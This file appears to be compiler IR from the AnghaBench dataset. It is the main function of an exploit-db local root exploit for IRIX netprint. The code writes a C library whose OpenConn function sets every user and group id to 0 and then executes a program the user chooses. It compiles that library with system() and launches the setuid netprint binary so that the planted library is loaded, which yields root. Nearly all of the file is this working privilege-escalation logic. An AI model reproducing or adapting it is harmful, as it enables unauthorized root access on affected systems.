; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20804.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20804.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32, i64 }

@.str = private unnamed_addr constant [66 x i8] c"[(IRIX)netprint[] local root exploit, by: v9[v9@realhalo.org]. ]\0A\00", align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"[!] syntax: %s </path/to/program/to/exec>\0A\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [40 x i8] c"[!] failed, could not get stats on %s.\0A\00", align 1
@S_ISUID = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [36 x i8] c"[!] failed, %s is not setuid root.\0A\00", align 1
@X_OK = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [60 x i8] c"[!] failed, %s doesn't seem to exist or is not executable.\0A\00", align 1
@CCPATH = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [69 x i8] c"[!] failed, %s compiler doesn't seem to exist or is not executable.\0A\00", align 1
@.str.6 = private unnamed_addr constant [57 x i8] c"[*] making symbols source file for netprint to execute.\0A\00", align 1
@SRCFILE = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.8 = private unnamed_addr constant [56 x i8] c"[!] failed, could not open temporary file to write to.\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"void OpenConn(){\0A\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c" seteuid(0);\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c" setuid(0);\0A\00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c" setegid(0);\0A\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c" setgid(0);\0A\00", align 1
@.str.14 = private unnamed_addr constant [108 x i8] c" printf(\22[*] success, uid: %%u, euid: %%u, gid: %%u, egid: %%u.\\n\22,getuid(),geteuid(),getgid(),getegid());\0A\00", align 1
@.str.15 = private unnamed_addr constant [22 x i8] c" execl(\22%s\22,\22%s\22,0);\0A\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"}\0A\00", align 1
@.str.17 = private unnamed_addr constant [20 x i8] c"void CloseConn(){}\0A\00", align 1
@.str.18 = private unnamed_addr constant [23 x i8] c"void ListPrinters(){}\0A\00", align 1
@.str.19 = private unnamed_addr constant [18 x i8] c"void SendJob(){}\0A\00", align 1
@.str.20 = private unnamed_addr constant [20 x i8] c"void CancelJob(){}\0A\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"void WaitForJob(){}\0A\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"void GetQueue(){}\0A\00", align 1
@.str.23 = private unnamed_addr constant [23 x i8] c"void StartTagging(){}\0A\00", align 1
@.str.24 = private unnamed_addr constant [22 x i8] c"void StopTagging(){}\0A\00", align 1
@.str.25 = private unnamed_addr constant [18 x i8] c"void Install(){}\0A\00", align 1
@.str.26 = private unnamed_addr constant [17 x i8] c"void IsDest(){}\0A\00", align 1
@.str.27 = private unnamed_addr constant [46 x i8] c"[*] done, now compiling symbols source file.\0A\00", align 1
@SOFILE = common dso_local global i8* null, align 8
@.str.28 = private unnamed_addr constant [40 x i8] c"[!] failed, could not allocate memory.\0A\00", align 1
@.str.29 = private unnamed_addr constant [20 x i8] c"%s %s -shared -o %s\00", align 1
@.str.30 = private unnamed_addr constant [63 x i8] c"[*] done, now checking to see if the symbols source compiled.\0A\00", align 1
@R_OK = common dso_local global i32 0, align 4
@.str.31 = private unnamed_addr constant [55 x i8] c"[!] failed, symbols source was not compiled properly.\0A\00", align 1
@.str.32 = private unnamed_addr constant [35 x i8] c"[*] done, now executing netprint.\0A\00", align 1
@.str.33 = private unnamed_addr constant [3 x i8] c"-n\00", align 1
@FAKESOFILE = common dso_local global i32 0, align 4
@.str.34 = private unnamed_addr constant [4 x i8] c"-h0\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"-p0\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"0-0\00", align 1
@.str.37 = private unnamed_addr constant [42 x i8] c"[!] failed, %s did not execute properly.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca %struct.stat, align 8
  %8 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 2
  br i1 %11, label %12, label %18

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0), i8* %15)
  %17 = call i32 @cleanup(i32 1)
  br label %18

18:                                               ; preds = %12, %2
  %19 = load i8*, i8** @PATH, align 8
  %20 = call i64 @stat(i8* %19, %struct.stat* %7)
  %21 = icmp ne i64 %20, 0
  br i1 %21, label %22, label %26

22:                                               ; preds = %18
  %23 = load i8*, i8** @PATH, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0), i8* %23)
  %25 = call i32 @cleanup(i32 1)
  br label %26

26:                                               ; preds = %22, %18
  %27 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 1
  %28 = load i64, i64* %27, align 8
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %36, label %30

30:                                               ; preds = %26
  %31 = load i32, i32* @S_ISUID, align 4
  %32 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 0
  %33 = load i32, i32* %32, align 8
  %34 = and i32 %31, %33
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %40, label %36

36:                                               ; preds = %30, %26
  %37 = load i8*, i8** @PATH, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i8* %37)
  %39 = call i32 @cleanup(i32 1)
  br label %40

40:                                               ; preds = %36, %30
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = load i32, i32* @X_OK, align 4
  %45 = call i64 @access(i8* %43, i32 %44)
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %53

47:                                               ; preds = %40
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.4, i64 0, i64 0), i8* %50)
  %52 = call i32 @cleanup(i32 1)
  br label %53

53:                                               ; preds = %47, %40
  %54 = load i8*, i8** @CCPATH, align 8
  %55 = load i32, i32* @X_OK, align 4
  %56 = call i64 @access(i8* %54, i32 %55)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %62

58:                                               ; preds = %53
  %59 = load i8*, i8** @CCPATH, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.5, i64 0, i64 0), i8* %59)
  %61 = call i32 @cleanup(i32 1)
  br label %62

62:                                               ; preds = %58, %53
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.6, i64 0, i64 0))
  %64 = call i32 @cleanup(i32 0)
  %65 = load i8*, i8** @SRCFILE, align 8
  %66 = call i32* @fopen(i8* %65, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %66, i32** %8, align 8
  %67 = icmp ne i32* %66, null
  br i1 %67, label %71, label %68

68:                                               ; preds = %62
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.8, i64 0, i64 0))
  %70 = call i32 @cleanup(i32 1)
  br label %71

71:                                               ; preds = %68, %62
  %72 = load i32*, i32** %8, align 8
  %73 = call i32 (i32*, i8*, ...) @fprintf(i32* %72, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %74 = load i32*, i32** %8, align 8
  %75 = call i32 (i32*, i8*, ...) @fprintf(i32* %74, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0))
  %76 = load i32*, i32** %8, align 8
  %77 = call i32 (i32*, i8*, ...) @fprintf(i32* %76, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  %78 = load i32*, i32** %8, align 8
  %79 = call i32 (i32*, i8*, ...) @fprintf(i32* %78, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0))
  %80 = load i32*, i32** %8, align 8
  %81 = call i32 (i32*, i8*, ...) @fprintf(i32* %80, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i64 0, i64 0))
  %82 = load i32*, i32** %8, align 8
  %83 = call i32 (i32*, i8*, ...) @fprintf(i32* %82, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.14, i64 0, i64 0))
  %84 = load i32*, i32** %8, align 8
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 (i32*, i8*, ...) @fprintf(i32* %84, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.15, i64 0, i64 0), i8* %87, i8* %90)
  %92 = load i32*, i32** %8, align 8
  %93 = call i32 (i32*, i8*, ...) @fprintf(i32* %92, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i64 0, i64 0))
  %94 = load i32*, i32** %8, align 8
  %95 = call i32 (i32*, i8*, ...) @fprintf(i32* %94, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.17, i64 0, i64 0))
  %96 = load i32*, i32** %8, align 8
  %97 = call i32 (i32*, i8*, ...) @fprintf(i32* %96, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.18, i64 0, i64 0))
  %98 = load i32*, i32** %8, align 8
  %99 = call i32 (i32*, i8*, ...) @fprintf(i32* %98, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.19, i64 0, i64 0))
  %100 = load i32*, i32** %8, align 8
  %101 = call i32 (i32*, i8*, ...) @fprintf(i32* %100, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.20, i64 0, i64 0))
  %102 = load i32*, i32** %8, align 8
  %103 = call i32 (i32*, i8*, ...) @fprintf(i32* %102, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i64 0, i64 0))
  %104 = load i32*, i32** %8, align 8
  %105 = call i32 (i32*, i8*, ...) @fprintf(i32* %104, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i64 0, i64 0))
  %106 = load i32*, i32** %8, align 8
  %107 = call i32 (i32*, i8*, ...) @fprintf(i32* %106, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.23, i64 0, i64 0))
  %108 = load i32*, i32** %8, align 8
  %109 = call i32 (i32*, i8*, ...) @fprintf(i32* %108, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.24, i64 0, i64 0))
  %110 = load i32*, i32** %8, align 8
  %111 = call i32 (i32*, i8*, ...) @fprintf(i32* %110, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.25, i64 0, i64 0))
  %112 = load i32*, i32** %8, align 8
  %113 = call i32 (i32*, i8*, ...) @fprintf(i32* %112, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.26, i64 0, i64 0))
  %114 = load i32*, i32** %8, align 8
  %115 = call i32 @fclose(i32* %114)
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.27, i64 0, i64 0))
  %117 = load i8*, i8** @CCPATH, align 8
  %118 = call i64 @strlen(i8* %117)
  %119 = load i8*, i8** @SRCFILE, align 8
  %120 = call i64 @strlen(i8* %119)
  %121 = add nsw i64 %118, %120
  %122 = load i8*, i8** @SOFILE, align 8
  %123 = call i64 @strlen(i8* %122)
  %124 = add nsw i64 %121, %123
  %125 = add nsw i64 %124, 13
  %126 = add nsw i64 %125, 1
  %127 = call i64 @malloc(i64 %126)
  %128 = inttoptr i64 %127 to i8*
  store i8* %128, i8** %6, align 8
  %129 = icmp ne i8* %128, null
  br i1 %129, label %133, label %130

130:                                              ; preds = %71
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.28, i64 0, i64 0))
  %132 = call i32 @cleanup(i32 1)
  br label %133

133:                                              ; preds = %130, %71
  %134 = load i8*, i8** %6, align 8
  %135 = load i8*, i8** @CCPATH, align 8
  %136 = load i8*, i8** @SRCFILE, align 8
  %137 = load i8*, i8** @SOFILE, align 8
  %138 = call i32 @sprintf(i8* %134, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.29, i64 0, i64 0), i8* %135, i8* %136, i8* %137)
  %139 = load i8*, i8** %6, align 8
  %140 = call i32 @system(i8* %139)
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.30, i64 0, i64 0))
  %142 = load i8*, i8** @SOFILE, align 8
  %143 = load i32, i32* @R_OK, align 4
  %144 = call i64 @access(i8* %142, i32 %143)
  %145 = icmp ne i64 %144, 0
  br i1 %145, label %146, label %149

146:                                              ; preds = %133
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.31, i64 0, i64 0))
  %148 = call i32 @cleanup(i32 1)
  br label %149

149:                                              ; preds = %146, %133
  %150 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.32, i64 0, i64 0))
  %151 = load i8*, i8** @PATH, align 8
  %152 = load i8*, i8** @PATH, align 8
  %153 = load i32, i32* @FAKESOFILE, align 4
  %154 = call i64 @execl(i8* %151, i8* %152, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.33, i64 0, i64 0), i32 %153, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.34, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i64 0, i64 0), i32 0)
  %155 = icmp ne i64 %154, 0
  br i1 %155, label %156, label %160

156:                                              ; preds = %149
  %157 = load i8*, i8** @PATH, align 8
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.37, i64 0, i64 0), i8* %157)
  %159 = call i32 @cleanup(i32 1)
  br label %160

160:                                              ; preds = %156, %149
  %161 = load i32, i32* %3, align 4
  ret i32 %161
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @cleanup(i32) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

declare dso_local i64 @access(i8*, i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i64 @malloc(i64) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i64 @execl(i8*, i8*, i8*, i32, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
